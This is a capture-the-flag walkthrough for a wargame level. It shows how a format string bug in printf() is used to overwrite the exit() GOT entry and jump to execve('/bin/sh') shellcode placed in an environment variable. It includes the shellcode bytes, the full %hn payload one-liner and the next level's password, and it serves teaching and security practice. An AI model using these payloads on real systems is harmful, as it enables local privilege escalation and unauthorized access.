Level05 Walkthrough - Complete Explanation
Overview
This level exploits a format string vulnerability in printf() to overwrite the Global Offset Table (GOT) entry of exit() and redirect execution to shellcode.
Vulnerability Analysis
1. What the program does:
cchar buffer[100];
fgets(buffer, 100, stdin);

// Convert uppercase (A-Z) to lowercase
for(i = 0; i < strlen(buffer); i++) {
    if(buffer[i] >= 'A' && buffer[i] <= 'Z') {
        buffer[i] ^= 0x20;  // XOR with 0x20 converts case
    }
}

printf(buffer);  // VULNERABLE - no format string!
exit(0);
2. The Vulnerability:
cprintf(buffer);  // Should be: printf("%s", buffer);
This allows format string attack where we can:

Read from stack using %x, %p
Write to arbitrary addresses using %n, %hn

3. The Challenge:

Program calls exit(0) immediately after printf
Can't overwrite return address on stack
Solution: Overwrite the GOT entry for exit() to point to our shellcode!

Exploitation Steps
Step 1: Store shellcode in environment variable
bashexport SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
Why 200 NOPs? Creates a large NOP sled - we can hit anywhere in those NOPs and slide to the shellcode.
Step 2: Find shellcode address
bash# Create helper program
cat > /tmp/getenv.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    printf("%p\n", getenv(argv[1]));
    return 0;
}
EOF

gcc -m32 /tmp/getenv.c -o /tmp/getenv
/tmp/getenv SHELLCODE
Result: 0xffffd814
Step 3: Find buffer position on stack
bash./level05 < <(python -c 'print "AAAA %x %x %x %x %x %x %x %x %x %x %x %x"')
```

**Output:**
```
aaaa 64 f7fcfac0 f7ec3add ffffd5ff ffffd5fe 0 ffffffff ffffd684 f7fdb000 61616161 20782520 25207825
Analysis: 61616161 (hex for "AAAA") appears at position 10
Step 4: Find exit GOT address
bashobjdump -R level05 | grep exit
```

**Result:** `080497e0 R_386_JUMP_SLOT   exit`

This means when the program calls `exit()`, it jumps to the address stored at `0x080497e0`.

### Step 5: Calculate the format string exploit

**Goal:** Write `0xffffd814` to address `0x080497e0`

**Strategy:** Use `%hn` to write 2 bytes at a time (32-bit has issues with 4-byte writes)

**Split into two 2-byte writes:**
- Write `0xd814` (55316 decimal) to `0x080497e0` (lower 2 bytes)
- Write `0xffff` (65535 decimal) to `0x080497e2` (upper 2 bytes)

**Format string structure:**
```
[addr1][addr2][padding1]%10$hn[padding2]%11$hn
Calculate padding:

Addresses written: 8 bytes total
For first write: need 55316 total → 55316 - 8 = 55308 bytes padding
For second write: need 65535 total → 65535 - 55316 = 10219 bytes padding

Step 6: The Complete Exploit
bash(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%55308x%10$hn%10219x%11$hn"'; cat) | ./level05
Breaking it down:

\xe0\x97\x04\x08 → Address 0x080497e0 (exit GOT, little-endian)
\xe2\x97\x04\x08 → Address 0x080497e2 (exit GOT + 2)
%55308x → Print 55308 characters (padding)
%10$hn → Write 2 bytes (total count so far) to address at stack position 10
%10219x → Print 10219 more characters
%11$hn → Write 2 bytes (total count so far) to address at stack position 11
cat → Keep stdin open for shell interaction

Step 7: Get the password
bashwhoami
# Output: level06

cat /home/users/level06/.pass
# Output: h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

## How Format String %n Works

- `%n` writes the **number of bytes printed so far** to an address
- `%hn` writes only 2 bytes (short)
- `%10$hn` writes to the 10th argument on the stack
- By placing addresses at positions 10 and 11, we control WHERE to write
- By controlling padding, we control WHAT to write

## Key Takeaways

1. **Format string bugs** allow reading/writing arbitrary memory
2. **GOT hijacking** bypasses stack protections by overwriting library function pointers
3. **Environment variables** can store shellcode in predictable memory locations
4. **NOP sleds** make exploitation more reliable by providing a large landing zone
5. Always validate format strings: use `printf("%s", buffer)` not `printf(buffer)`

## Memory Layout Summary
```
0x080497e0: [exit GOT entry] → Originally points to libc exit
                             → We overwrite to 0xffffd814

0xffffd814: [NOP sled + shellcode] → execve("/bin/sh")
When exit(0) is called, it jumps to our shellcode instead! 🎉
Password for level06: h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq